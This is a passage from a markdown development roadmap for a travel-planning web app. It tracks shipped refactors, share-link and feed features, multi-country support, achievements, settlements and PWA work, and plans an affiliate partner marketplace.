**L** · `frontend/static/js/src/pages/home.ts` (was 2,121 lines), `pages/home-mount/`

- [x] The 2,199-line legacy `renderHome()` is retired. JSX implementation lives at `pages/home-mount/` split across Home.tsx (orchestrator), WelcomePage.tsx, HomeHeader.tsx, MapSearchBar.tsx, PoiPillsRow.tsx, HeroMap.tsx, TripBody.tsx, handlers.ts.
- [x] `pages/home.ts` is now 37 lines — a cross-page surface shim that re-exports the few legacy entry points other modules still call (`stopHomeSlideshow`, `POI_CATEGORIES`, `openDayView`, `openPdfPreview`, `openShareToFeedModal`, etc.).
- [x] Every page is now JSX-mounted: Home, Expenses, Settlement, AI, Insights, Settings, Profile, Collections, Feed, Friends, Budgets, Todo, Search. The strangler pattern is complete.
- [x] Subsequent feature work (Phase 4) ships at full speed — every page is JSX-first.

### 3.4 `TripContext` + `useActiveTrip()` hook — ✅ Shipped 2026-05-17

**S** · `frontend/static/js/src/react/TripContext.tsx`, ~6 React pages

- [x] One canonical place that resolves "active trip + all derived fields." `useActiveTrip()` returns `{ trip, activeTripId, expenses, tripDays, settlements, members, isOwner, canEdit, canEditExpenses, canDelete }` — every shape a consumer might want, derived in one place. Companion hook `useTrip(tripId)` for the picked-but-not-active case (Settlement page picker).
- [x] Memoized selectors. The hook reads via `useStore` slices + a `useMemo` that re-runs only when the upstream slices (trips, expenses, tripDays, settlements) change identity — not on every `state:changed` emit. Notification polls + unrelated emits no longer recompute the active-trip's expense filter.
- [x] Backwards-compat preserved. The hook reads from the SAME `STATE` container the legacy `.ts` imperative pages mutate; no projection layer needed. React + imperative code see the same trip identity at every moment.
- [x] Six React pages migrated to `useActiveTrip` / `useTrip`: AI.tsx, Expenses.tsx, HistoryTab.tsx, Insights.tsx, Settlement.tsx, Home.tsx. Deliberately skipped: ManualTab.tsx (one-shot render by design, doesn't subscribe), Search.tsx + Collections.tsx + Settings.tsx (writers of activeTripId, not readers of trip identity).
- [x] Pre-existing Todo.tsx consumer kept (already on the hook from §3.3 wave).

### 3.5 Extract `serialize_trip_row` / `serialize_expense_row` — ✅ Shipped

**S** · `src/helpers.py`

- [x] Both helpers live in `src/helpers.py`. Single source of truth for the camelCase shaping that converts raw `trips` / `expenses` row dicts into the API response shape.
- [x] `routes/data.py:412` calls `serialize_trip_row()`; `routes/data.py:470` maps `serialize_expense_row()` across the expense rows.
- [x] `routes/public.py:131` calls `serialize_trip_row()` on the public-trip path. Drift risk between the two routes is now zero — any field added to the shape lands in both surfaces atomically.

### 3.6 Feed-event registry — ✅ Shipped 2026-05-16

**M** · `src/feed_events.py`, `src/routes/feed.py`

- [x] `FEED_EVENT_TYPES: list[FeedEventType]` registry — one dataclass entry per event type bundling `name`, `id_pattern`, `visibility_check`, `build`, and (optional) `engagement_recipient`. (Shipped 2026-05-16.)
- [x] Each event type ≈ self-contained in `feed_events.py`: pattern + visibility callable + builder function + optional engagement-recipient hook. The eight existing types (trip_created, trip_archived, trip_joined, friendship, share, repost, settled_up, achievement) migrated unchanged in behaviour.
- [x] Adding `trip_cloned` / `expense_added` / etc. now becomes a single new FeedEventType entry — no edits to `routes/feed.py`. The dispatch helpers `parse_event_id`, `caller_can_see_event`, `engagement_recipient`, and the `FEED_EVENT_BUILDERS` iteration all read straight from the registry.
- [x] `routes/feed.py` shrank from 1,195 → ~600 lines (-50%) — the per-event-type knowledge moved to `feed_events.py`, the route file is now focused on HTTP handlers + engagement-notification emission.
- [x] 30 new unit tests in `tests/test_feed_events.py` cover registry invariants (unique names, every entry has the required fields, every pattern matches its own canonical id), `parse_event_id` round-trips for every shape, `caller_can_see_event` delegation, and `engagement_recipient` (returns post owner for share/repost, None for everything else).

### 3.7 Decompose `utils.ts` (526 lines) — ✅ Shipped

**S** · `frontend/static/js/src/utils.ts`, `src/utils/*`

- [x] `currency.ts` — exchange-rate helpers + `formatHome`, `currencySymbol`, `convertCurrency`. Pulled out from the monolith.
- [x] `place-names.ts` — `cleanPlaceName`, `shortPlaceName`, `prettyCountry`, the new `countryCodeToFlag` (§4.2), `generateTripQuotes` for the welcome card.
- [x] `dom-helpers.ts` — `esc`, query selectors, focus-trap utilities, empty-state card builder.
- [x] `empty-state.ts` — the `buildEmptyCardHtml` factory pulled out into its own file (used by Feed, Settlement, Insights, History).
- [x] `showConfirmModal` lives in `components/Modal.tsx`'s area (alongside `showModal`) — `utils.ts` re-exports it for back-compat with the 40+ existing call sites.
- [x] `utils.ts` is now a 47-line re-export façade so call sites don't have to churn; new code imports directly from the focused modules. Original 526-line junk drawer is gone.

### 3.8 Sentry + structured logging — ✅ Shipped 2026-05-16

**S** · `src/observability.py`, every trip-scoped route

- [x] Tag every request with `user_id` / `trip_id` via `logging.info(extra={...})`. The framework-level `attach_request_context` sets request_id + user_id on every request automatically; trip_id is opt-in per route via `bind_trip_context(trip_id)`. Wired into routes/trips, days, expenses, settlements, public so every trip-mutating event carries the trip context on its log line + Sentry scope. (Shipped 2026-05-16)
- [x] Sentry release tags wired into the deploy. `resolve_release()` walks `SENTRY_RELEASE` env → `GG_RELEASE` env → `git rev-parse --short=12 HEAD` → None. Deploy step doesn't need to set anything new; the running WSGI process self-identifies its release from the repo. Subprocess failure modes (no git, locked repo, 1.5s timeout) all fall through silently — observability MUST NOT block boot. (Shipped 2026-05-16)
- [x] Highest-leverage 1-hour change before any wider launch. (Shipped 2026-05-16)

---

## Phase 4 — Product features (next 6 months)

Ordered by leverage on the VISION's three killer features (social, expenses, planning).

### 4.1 Public share-via-link with cost banner ⭐ **single most leveraged feature**

**M** · 4-6h spec already in `FUTURE_FEATURES.md`

- [x] Alembic migration: `share_token TEXT UNIQUE NULL`, `share_views INTEGER DEFAULT 0`, `share_show_cost INTEGER DEFAULT 0` on `trips`. Plus partial UNIQUE index on `share_token`. (Shipped 2026-05-13)
- [x] New unauthenticated route `GET /share/<token>` in `main.py` (HTML render) + `GET /api/share/<token>` in `routes/public.py` (JSON). (Shipped 2026-05-13)
- [x] New owner-only routes `POST` / `DELETE /api/trips/<id>/share` in `routes/trips.py`. (Shipped 2026-05-13)
- [x] Public page lives as a Flask-rendered `frontend/templates/share.html` (NOT a React leaf — see deviation note below).
- [x] Edit Trip modal: "Get share link" / "Manage share link" button → opens `openShareTripModal()` with "Show total cost on the page" toggle. (Shipped 2026-05-13)
- [x] Public artifact renders: owner chip + cover photo + day-by-day Path + (opt-in) cost banner with total + per-country breakdown. (Shipped 2026-05-13)
- [x] **Server-side rendered OG meta tags** (`og:title`, `og:description`, `og:image`, Twitter Card) so chat-app link previews show the cover photo + headline. (Shipped 2026-05-13)
- [x] Views counter deduped by anonymous 24h httponly cookie. Chip shows on the public page itself + on the owner's Collections card. (Shipped 2026-05-13)
- [x] Pytest coverage for 10 share-flow paths (token rotation, owner-only gate, anonymous read, privacy posture, view-count dedupe, OG meta, 404 friendliness). (Shipped 2026-05-13)
- [x] E2E test for the no-auth path. (Shipped 2026-05-17 — `tests/e2e/share-public.spec.js`, 3 tests: artifact-renders-with-no-auth-state, view-counter-dedupes-then-increments, revoked-token-shows-friendly-404. Uses `browser.newContext()` for the visitor side so each test starts with a fully cold cookie jar — exactly mirrors a chat-app link click from a stranger's phone. Asserts that no JWT / STATE lands in localStorage on the visitor's side, that the page renders as static HTML (not the SPA shell), that OG meta tags arrive in the first byte, and that the cost banner only renders when the privacy toggle was on.)

**Deviation from the original spec:** the public page is a Flask-rendered `share.html` template, NOT a React leaf under `pages/share/`. Reasons:

1. OG meta crawlers (WhatsApp, LinkedIn, iMessage) need the tags in the initial HTML response — a React SPA shell that hydrates them later would render previews with empty meta. A Flask template ships the tags at first byte.
2. The shared artifact is read-only and has no STATE / login / navigation — there's no React benefit. A 60-line standalone HTML page is the right shape.
3. Visitors on slow connections see the trip without downloading the 460KB JS bundle.

**Why this ships first:** delivers all three killer features in one launch (shareable artifact + cost-as-content + viral surface). Every later feature is more useful once this exists.

### 4.2 Explore tab on feed (cold-start fix) — ✅ Shipped 2026-05-17

**M** · `src/routes/feed.py`, `frontend/static/js/src/pages/feed/`

- [x] `GET /api/feed/explore` — public trips (those with `share_token IS NOT NULL`) ranked by `recency × country × engagement`. Recency = linear 60-day decay. Country factor = 1.5× when the trip's country isn't in the viewer's visited set, 1.0× when it is (encourages discovery without hiding repeats). Engagement bonus = `1 + log1p(share_views) × 0.3`. Excludes the viewer's own + member-of trips. Limit 24. (Backend shipped earlier in the §4.1 / §4.2 wave; verified live.)
- [x] **Country filter chip strip** — shipped 2026-05-17. Derived from the loaded `explore` items, ordered by frequency (most-common destination first). Each chip shows flag emoji + country name + result count. "All" chip resets. Renders only when ≥2 distinct countries are present (a single-country chip is redundant). Selected state lifts to brand-blue; un-selected uses theme-aware tokens so dark mode works without overrides. Horizontally scrollable on narrow viewports. Filtered-empty state surfaces a clear "no matches" card + a "Show all countries" reset button.
- [x] Card click → `/share/<token>` — implemented in `ExploreCard.tsx` as an `<a href>`, so middle-click / cmd-click opens in a new tab naturally.
- [x] Flag emoji helper added to `src/utils/place-names.ts` (`countryCodeToFlag`) — converts 2-letter ISO code to the regional-indicator pair the OS renders as a flag. Defensive for missing / malformed inputs.

**Why:** today a new user with no friends sees an empty feed. VISION's user flow opens with "browsing other people's trips" — this fixes it.

### 4.3 Multi-country trip support — ✅ Shipped 2026-05-17 (foundation + chip strip + Profile + Insights)

**L** · `migrations/versions/a2c5e8d1f7b3_add_trip_countries_json.py`, `src/helpers.py`, `src/routes/trips.py`, `src/routes/public.py`, `src/routes/data.py`, `src/achievements.py`, `frontend/static/js/src/pages/home-mount/HeroMap.tsx`, `frontend/static/js/src/pages/home-mount/HomeHeader.tsx`, `frontend/static/js/src/pages/profile/Profile.tsx`, `frontend/static/js/src/pages/profile/FootprintMap.tsx`, `frontend/static/js/src/pages/insights/Insights.tsx`

- [x] Derive trip countries from day pins. (Shipped 2026-05-17 — the reverse-geocode loop in `HeroMap.tsx` builds the discovered set from each day's lat/lng via Google's Geocoder. `trip_days` doesn't have its own `country_code` column; the lat/lng is the canonical signal and country falls out of the existing geocode-on-render path. Cached in sessionStorage so re-renders don't re-bill the quota.)
- [x] Cache as `trip_countries_json` for fast reads. (Shipped 2026-05-17 — new alembic migration adds the TEXT column to `trips`. `serialize_trip_row` reads it into a `countries: ["PT", "ES"]` array (upper-cased, deduped). `/api/trips` upsert accepts a `countries` array, normalizes (upper-case, strip, 2-char only), and dedupes preserving insertion order so the primary country stays at position 0. Public-trip read + clone path also pull/copy the column. 5 pytest cases pin the contract: round-trip, normalization edge cases, missing field → `[]`, empty-array → NULL the column, malformed JSON → defensive `[]`.)
- [x] Trip header shows `🇵🇹 🇯🇵` chip strip instead of one country. (Shipped 2026-05-17 — `HomeHeader.tsx` renders a centered flag-emoji row below the H1 greeting via `countryCodeToFlag` (the helper added in §4.2). Only renders when ≥2 countries are known (single-country trip would just duplicate the H1 country name). `aria-label` resolves the codes to localized country names via `Intl.DisplayNames` so screen readers say "Trip in Portugal, Spain" rather than raw regional-indicator pairs.)
- [x] Profile country-color map keys off the new array (instead of scalar `trips.country`). (Shipped 2026-05-17 — `Profile.tsx` adds `deriveUniqueCountryCodes(trips)` that walks every trip's `tr.countries` array PLUS the scalar `tr.countryCode`, deduped + upper-cased. The country-stats chip on the profile header now counts every leg (a Portugal+Spain trip lights up as 2). `FootprintMap.tsx` accepts a new `uniqueCountryCodes` prop and uses it as the highest-priority ISO match key for the country-fill GeoJSON layer, falling back to the scalar `countryCode` derivation when the prop is empty (defensive for legacy loads where no trips have been re-saved since §4.3 landed). `src/achievements.py:_country_count` walks `trip_countries_json` via SQLite's `json_each` so the globe-trotter badges count multi-country legs correctly — 2 trips covering 4 countries now unlocks `globe_trotter_3` instead of stopping at 2. Two new pytest cases pin the new aggregation: a 4-country count from 2 multi-country trips fires the 3-threshold badge AND the dedupe between primary `country_code` and array `[0]` doesn't double-count.)
- [x] Insights rolls expenses up by country leg automatically. (Shipped 2026-05-17 — Insights aggregates `e.displayValue` by `e.country` (the per-expense country picker on the manual-entry form — already user-owned, no need to derive). Renders a new "Spent per Country" card with each country sorted by amount descending, percentage bar, and amount in the user's display currency. Card is conditional: ≥2 distinct expense countries unlocks it (a single-country trip would just show "Portugal: 100%", redundant with the existing Category card). Includes i18n strings in all four locales (en, es, fr, pt). Top 10 cap matches the spender/category lists.)

**Why:** VISION names this as a missing feature. Real trips chain destinations; the schema is the only blocker.

### 4.4 Achievements / Badges with feed broadcast — ✅ Shipped 2026-05-17 (badge variety extended)

**M** · `src/achievements.py`, `migrations/versions/f9a3b7e1c842_catchup_post_baseline.py`

- [x] `user_achievements` table (user_id, badge_id, earned_at, context_json). Created in the catchup migration with UNIQUE(user_id, badge_id) for idempotent insert.
- [x] Detection runs on every /api/data poll — cheap (each rule is a single SQL count/aggregate) + naturally batched with the existing sync flow. `check_user_achievements()` returns newly-earned badges so the route can notify + surface them on the next response in one pass.
- [x] **Badge variety (2026-05-17):** 15 badges shipped end-to-end —
    - Country tiers: `globe_trotter_3` / `_10` / `_25` / **`_50`** (4 tiers).
    - Single-trip: **`longest_trip`** (≥14 days), **`priciest_trip`** (≥€1000 recorded spend), **`most_companions`** (≥5 companions on the roster).
    - Intra-country: `repeat_country` (≥2 trips) + **`intra_country_3`** (≥3 trips in same country).
    - Streaks: **`back_to_back`** (2 consecutive calendar months with a trip; year-boundary aware).
    - Other: `first_trip`, `archivist`, `social_butterfly` (≥3 mutual follows), `first_share`, `first_settle_up`.
      Each badge carries a `context_json` payload (countryCount / tripId / days / spendEur / count / firstMonth / etc.) so the frontend renderer can show meaningful tooltips.
- [x] Earning a badge fires a `feed_event_type=achievement_unlocked` event via `_build_achievement_unlocked` in `src/feed_events.py` (the §3.6 registry). Friends-of-actor + actor themselves see it; engagement (like/comment) allowed.
- [x] Profile renders the horizontal badge strip via `pages/profile/AchievementsStrip.tsx` (tap-to-pin tooltips).
- [x] Notification fires per unlock via `notify_achievements()` in achievements.py, so the user sees the unlock in their bell dropdown on the next poll.
- [x] **Tests:** 7 new tests in `tests/test_api.py` cover the badge-variety expansion — positive (badge fires at threshold + correct context), negative (just-under-threshold doesn't fire), and edge cases (year-boundary streak, malformed JSON shapes). All 336 backend tests passing.

**Why:** today the feed is quiet for weeks between trips. Achievements generate organic activity AND reward internal/domestic tourism (VISION call-out).

### 4.5 Settle Up flow — ✅ Shipped 2026-05-16 (single-write, server-canonical)

**M** · `frontend/static/js/src/pages/settlement/legacyRender.ts`, `balances.ts`, `Settlement.tsx`

- [x] "Settle Up" button on each balance row in `pages/settlement/` — pre-existed via the per-row `.settle-debt-btn` + the `.open-manual-settle-btn` for the with-method-and-note flow.
- [x] Manual settle modal collects **method** (Cash / Revolut / Bank transfer / Wise / PayPal / Custom) + **optional note** in addition to from/to/amount. Mirrors the server's `_ALLOWED_METHODS` set so every value persists unchanged. (Shipped 2026-05-16.)
- [x] Server writes the `settlements` row, drops a `settled_up` feed event, fires a notification to the recipient — automatically via the existing backend (POST /api/settlements + `_build_settled_up` + the settlement route's notification emitter). `settleDebt` calls `createSettlement(...)` and awaits the response when both parties resolve to user_ids (via `companion.linkedUserId`); the server's `Settlement` row is then spliced into `STATE.settlements` for immediate UI update. Legacy companion-by-name pairs (no user account on at least one side) keep the local fake-expense path — there's no user_id to attach the server row to.
- [x] Balance math reads `STATE.settlements` directly via the new `applySettlementToBalances` helper in `balances.ts` (both per-trip and cross-trip computations). User_ids on the settlement row are mapped back to companion names via `findTripCompanionByLinkedUser`. No double-counting risk: new writes land in exactly ONE store (settlements for user-linked, expenses for name-only).
- [x] Preserve original currency for receipts — `createSettlement` passes `currency` + `euroValue` through to the server unchanged; the settlements table stores both. The chip + history rows display `euroValue` so the cross-currency math stays consistent.
- [x] Dual-write retired: `settleDebt` for user-linked pairs no longer pushes a fake `isSettlement` expense row. The server settlement is the single source of truth. Old isSettlement expense rows (from pre-§4.5 data + name-only fallback) continue to contribute via the expense-based math; they coexist cleanly because no new write goes to both stores.
- [x] History tab + trip-picker chip + tab-nav settlement count all merged across the two stores via `collectSettlementHistory` + `settledStatsForTrip` helpers — users see one list with all their settlements, regardless of source. Method gets a small uppercase chip on server-side rows; note renders as italic subtitle.
- [x] `deleteSettlement` now routes by `source` attribute ('expense' → STATE.expenses filter; 'settlement' → DELETE /api/settlements/<id>). Server enforces "creator OR trip owner" rule; recipient gets 403.

**Why:** today expense calc stops at "Sara owes Andrés €45." Closing the loop keeps users in TGG instead of bouncing to Splitwise.

### 4.6 Trip cloning — ✅ Shipped 2026-05-13

**S** · `src/routes/trips.py`

- [x] `POST /api/trips/clone/<source_id>` — deep-copies trip + days + markedPlaces into a new draft owned by the caller. Companions explicitly NOT seeded (those are the original owner's friends, not yours). Plus `POST /api/share/<token>/clone` for the share-link recipient path.
- [x] Available on archived-trip detail (own) AND via share-link (anyone's). The "Clone" button sits next to the Share/Restore buttons in the Collections archived-trip hero; the "✨ I want this trip" CTA appears at the bottom of every `/share/<token>` public page.
- [x] No expenses copied — clone is a fresh template, not an accounting record.
- [x] "I want this trip" CTA on the public share artifact. The link routes to `/?cloneFromShare=<token>`; SPA captures the intent into sessionStorage, fires the clone post-login (or immediately if already authed), then navigates to home with the new draft active.
- [x] Pytest coverage: 7 new tests — happy path, expenses+share-state dropped, private-trip stranger gets 404 (no enumeration leak), public-trip stranger succeeds + becomes owner, clone-via-share-token works without membership, unknown-token 404, anonymous 401.

**Why:** closes the VISION loop — "every shared trip is fuel for someone else's planning."

### 4.7 Followers / following (one-way graph) — ✅ Shipped (Model B)

**M** · `src/routes/follows.py`, new `follows` table

- [x] Built as a separate `follows` table (Model B), not a `direction` column on `friends`. The two coexist: `follows` is the authoritative one-way social signal; `friends` (= mutual follow) is derived. Migration in `f9a3b7e1c842_catchup_post_baseline.py` creates the table with UNIQUE(follower_id, followee_id) + indexes on both sides + ON DELETE CASCADE via §1.4.
- [x] `routes/follows.py` (206 lines) handles POST `/api/follow/<user_id>`, DELETE `/api/follow/<user_id>`, GET `/api/follow/status/<user_id>`. Asymmetric by design: A follows B doesn't require B follows A.
- [x] Profile page (`pages/profile/Profile.tsx`) shows live "Following / Followers" counts. Fetched async on mount via `follower_counts(cursor, user_id)` helper.
- [x] Plus `FollowButton.tsx` for the action affordance on other users' profiles. Optimistic toggle + debounced API call.
- [x] §3.6 feed event `new_friendship` reads from `follows` (when both directions exist) to surface the mutual-follow moment in the feed.

**Why:** today the social graph is symmetric. A creator with a good trip can't have an audience. Unblocks the Instagram-aesthetic angle.

### 4.8 🆕 **Modules — partner integrations marketplace**

**L** · Spans multiple phases, see breakdown below

A new section on the trip page (and the Plan AI page) where the user sees curated suggestions for every category of trip purchase. Each card deep-links to the partner with destination/dates/companion-count prefilled in the URL. TGG earns affiliate revenue per click/booking.

This is killer feature #3 from VISION ("organic business discovery") in its first concrete form. It's also the primary monetization path — every user who books anything generates revenue.

**Categories to support, in launch order:**

| #   | Category                  | Partners (affiliate-friendly)               | Priority |
| --- | ------------------------- | ------------------------------------------- | -------- |
| 1   | **Flights**               | Skyscanner, Kayak, Kiwi.com, Google Flights | Launch   |
| 2   | **Accommodation**         | Booking.com, Airbnb, Hostelworld, Agoda     | Launch   |
| 3   | **Activities / tours**    | GetYourGuide, Viator, Klook, Tiqets         | Launch   |
| 4   | **Transport (intercity)** | Trainline, Omio, BlaBlaCar, Rome2Rio        | Phase 2  |
| 5   | **Car rental**            | Rentalcars.com, Discover Cars, Sixt         | Phase 2  |
| 6   | **Restaurants**           | TheFork, OpenTable, Resy                    | Phase 2  |
| 7   | **eSIM / mobile data**    | Airalo, Holafly, Nomad                      | Phase 2  |
| 8   | **Travel insurance**      | World Nomads, SafetyWing, Heymondo          | Phase 3  |
| 9   | **Visa / ESTA**           | Sherpa, iVisa                               | Phase 3  |
| 10  | **Local guides**          | ToursByLocals, Withlocals                   | Phase 3  |
| 11  | **Luggage storage**       | Bounce, Radical Storage                     | Phase 3  |
| 12  | **Airport transfers**     | Welcome Pickups, GetTransfer                | Phase 3  |
| 13  | **Travel SIM/data (alt)** | Airalo (already #7)                         | —        |
| 14  | **Currency / FX**         | Wise, Revolut (affiliate links)             | Phase 3  |

**Architecture:**

- [ ] New `module_clicks` table (user_id, trip_id, module, partner, clicked_at, deep_link_url) for analytics + affiliate attribution.
- [ ] `routes/modules.py` — one endpoint per category that takes (destination, dates, pax) and returns ranked partner cards with prebuilt deep-link URLs.
- [ ] Each card UI: partner logo, key prefilled params shown ("Lisbon → Tokyo · Sep 14-21 · 2 adults"), CTA button.
- [ ] Frontend: new `<TripModules>` React component placed on `pages/home/Home.tsx` (trip detail) AND `pages/ai/AI.tsx` (post-itinerary section).
- [ ] Each click logs to `module_clicks` + opens the deep link in a new tab.

**Affiliate program signups (the legwork — should start NOW even if implementation is later):**

- [ ] Skyscanner Partner Network — apply, get unique account, get deep-link API.
- [ ] Booking.com Affiliate Partner Programme — same.
- [ ] GetYourGuide Partner Program — same.
- [ ] Awin / CJ / Impact accounts (aggregators that cover Airbnb, Viator, Klook, Trainline, Wise, World Nomads, etc. through one dashboard).

**Why this fits TGG specifically:**

Generic travel sites have ads. TGG's edge: **the user is already telling you exactly what they need** by planning the trip. A "Book flights" card on a trip from Lisbon → Tokyo for Sep 14-21 with 2 companions doesn't feel like an ad — it feels like a tool that anticipates the next step. This is VISION's "organic business discovery" in its purest form.

**Why this comes AFTER 4.1-4.7:**

Without users, affiliate revenue is zero. The earlier features build the audience. Modules monetize it. **Don't ship Modules before you have users to click them.**

**A B2B alternative worth exploring in parallel:**

Per VISION's open question, target tourism companies (Abreu Viagens, etc.) as B2B customers: TGG becomes the platform they use to store + share trip data with their clients. They get a polished app without building one; you get users + recurring revenue. Easier to close pre-critical-mass than impression-based ads. **Worth a discovery call with 2-3 tour operators in Q3 2026.**

### 4.9 Trip media polish — ✅ Shipped (truth-check 2026-05-17, all three sub-items already live)

**M** · `frontend/static/js/src/pages/home/lightbox.ts`, `frontend/static/js/src/pages/home/tripMediaModals.ts`, `frontend/static/js/src/exif.ts`

- [x] Drag-to-reorder photos in trip detail. (Shipped — `tripMediaModals.ts` renders a `⠿` drag handle on each `trip-source` photo card. Pointer events on the modal root drive the gesture; `_targetPhotoIdAtPointer` picks the hit-target from `clientX/Y`. Reorder splices `trip.photos`, emits `state:changed`, and `upsertTrip`s. Day-source photos are not drag-handled — they live inside `day.photos` arrays and would need a separate persist path; out of scope for v1, by design comment.)
- [x] EXIF date → auto-assign photo to a trip day. (Shipped — `src/exif.ts` dynamic-imports `exifr` (~27KB gz, only fetched on first photo-upload). `readPhotoDate(file)` reads `DateTimeOriginal` / `CreateDate` / `DateTime` in that fallback order, renders the LOCAL-time YYYY-MM-DD so timezone-shifted captures bucket intuitively. `resolveDayIdForFile(file, trip)` matches against `STATE.tripDays`. Upload loop in `tripMediaModals.ts:411` chains it: `dayId = (await resolveDayIdForFile(file, trip)) ?? anchorDayId`. Success toast surfaces the auto-tag count when ≥1 photo got matched. 2 Playwright cases pin the contract (2026-05-17): fixture JPEG with `DateTimeOriginal=2026:06:02` uploaded to a trip whose Day 2 sits on that date lands on Day 2; uploaded to a trip without that date falls back to Anchor. Fixture-generation script at `scripts/generate_test_fixtures.py` (Pillow + `Image.Exif`, 50 LoC) emits a 393-byte deterministic JPEG.)
- [x] Photo lightbox with swipe (mobile-first, reuses the swipe handler). (Shipped — `pages/home/lightbox.ts` `openPhotoLightbox(srcs, startIndex)` renders a navigable carousel with prev/next chevrons, pointer-events swipe (works for touch + mouse + pen), keyboard arrows, and a `3 / 12` counter chip. 50px swipe threshold filters finger jitter; horizontal-dominant ratio gate rejects mostly-vertical drags so scroll attempts don't accidentally page-flip. Image-tap is a deliberate no-op (a stray touch during navigation shouldn't kill the modal); explicit ✕ button + backdrop tap are the dismiss affordances. 5 Playwright cases pin the contract (2026-05-17, `tests/e2e/photo-lightbox.spec.js`): click → right image + `1 / N` counter, chevrons cycle with edge-case hidden states, keyboard nav + Escape, close button + backdrop both dismiss, single-photo branch hides chevrons/counter but keeps the ✕.)

### 4.10 PWA install + offline trip detail — ✅ Shipped 2026-05-17

**M** · `frontend/static/sw.js`, `frontend/static/manifest.json`, `frontend/static/icons/`, `frontend/static/js/src/bootstrap/install-prompt.ts`

- [x] Service worker hand-rolled (sw.js, ~270 lines) — see §2.20 for the strategy breakdown. Caching is now real: app shell + GET `/api/*` network-first with cache fallback, `/static/uploads/*` cache-first, mutations pass through. A user mid-trip on flaky signal sees their itinerary either fresh (network) or from the last successful response (cache); user-uploaded photos render even fully offline.
- [x] Icon raster set generated from the brand mark (`scripts/generate_icons.py`, Pillow-based). Outputs land in `frontend/static/icons/`: `icon-{16,32,180,192,512}.png` (purpose='any') + `icon-{192,512}-maskable.png` (purpose='maskable', 12% padding for Android adaptive masks). Re-runnable / idempotent so the brand mark can change once a year without ceremony.
- [x] `manifest.json` updated — was favicon-only, now declares the full PNG set including both 192/512 'any' purpose icons (Android install minimum) and 192/512 maskable variants (Android adaptive icons). Kept the SVG favicon entry for browsers that prefer vector.
- [x] `index.html` apple-touch-icon switched from `favicon.svg` to `icon-180.png` (the canonical apple-touch-icon size; iOS scales down for older devices). Removed the stale "Real PNG icons come in Phase L" comment.
- [x] Install-prompt gate (`install-prompt.ts`, 271 lines): three code paths — Chrome/Edge/Android consumes `beforeinstallprompt`, iOS Safari shows an instructional "Tap Share → Add to Home Screen" banner, already-installed (standalone display-mode) shows nothing. localStorage-backed visit counter gates the banner on the SECOND visit per user (`visits < 2 return`), and a sticky dismiss flag means one ✕ click = silent forever. `appinstalled` listener clears any lingering banner.
- [x] Tests (`tests/test_api.py`): `/sw.js` route serves with `Service-Worker-Allowed: /` + `Cache-Control: no-cache`, `/manifest.json` serves with `application/manifest+json`, manifest declares the required 192/512 'any' + at-least-one maskable icons, and every icon URL the manifest references actually serves with an `image/*` content type (so a missing-file slip in the build breaks CI instead of silently breaking installability).

---

## What I'd do in what order (one-paragraph summary)

**This week:** ship 0.1, 0.2, 0.5, 0.6 (security critical) + 1.4 (SQLite WAL) — those are all small and dangerous-when-skipped.

**This month:** clear Phase 1. Critical security closure + the data-integrity bugs + the basic UX bugs that make the app feel rickety.

**This quarter:** ship 4.1 (share-via-link with cost banner + SSR/OG meta). Pair with 3.3 starting on Feed migration in the background. Apply for the Phase 1 affiliate programs (Skyscanner, Booking, GetYourGuide) NOW so credentials are ready when 4.8 lands.

**Next quarter:** 4.2 (Explore), 4.4 (Achievements), 4.5 (Settle Up). Then 4.8 launch phase 1 (flights + accommodation + activities) once traffic justifies it.

**Year 2:** 4.3 (multi-country), 4.7 (followers), 4.8 phases 2-3, B2B exploration with tour operators.

---

_This doc is the working source of truth. Update checkboxes as items ship. When items grow stale (3+ months without movement), drop them or note why they're parked._
